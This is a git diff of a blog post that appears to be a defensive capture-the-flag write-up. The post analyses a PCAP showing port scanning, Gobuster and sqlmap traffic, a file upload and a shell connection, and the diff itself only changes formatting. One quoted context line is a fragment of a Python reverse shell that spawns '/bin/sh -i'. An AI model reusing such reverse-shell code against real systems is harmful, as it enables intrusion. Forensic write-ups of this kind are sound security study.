@@ -12,11 +12,11 @@ category:
 >
 >The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.
 
-My usual approach is to move back and forth from general statistics to close up investigation of streams. 
+My usual approach is to move back and forth from general statistics to a close-up investigation of streams. 
 
-### PORT SCANNING 
+#### PORT SCANNING 
 
-So I would start with **Statistics** -> **Endpoints** -> **TCP** .  By sorting ports we can instantly identify port incrementation that is indication of the port scanning.
+So I would start with **Statistics** -> **Endpoints** -> **TCP**.  By sorting ports we can instantly identify port incrementation which is an indication of the port scanning.
 
 ![ports-last](https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/64ed0c5d-ed6f-4bb3-ad10-a3d81182d0c5)
 
@@ -37,17 +37,20 @@ Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 sqlmap/1.4.7#stable (http://sqlmap.org)
 
 ```
-It will reveal the tools used which are `Gobuster 3.0.1`,
+It will reveal the tools used which are `Gobuster 3.0.1`
+
+
 ![gobuster](https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/c2578128-05ad-4ecb-be9d-5fc636077665)
 
 
-and   `sqlmap 1.4.7`
+and `sqlmap 1.4.7`
+
 
 ![sql](https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/12fab041-a8b6-46f6-a133-08a75a89bd0b)
 
 
 ---
-### FILE UPLOAD
+#### FILE UPLOAD
 
 
 **Export objects** -> **HTTP** 
@@ -97,7 +100,7 @@ p=subprocess.call(["/bin/sh","-i"]);
 
 ---
 
-### SHELL CONNECTION
+#### SHELL CONNECTION
 
 ![shell-python](https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/52058542-85ec-48c7-b96f-916ca5739572)
 
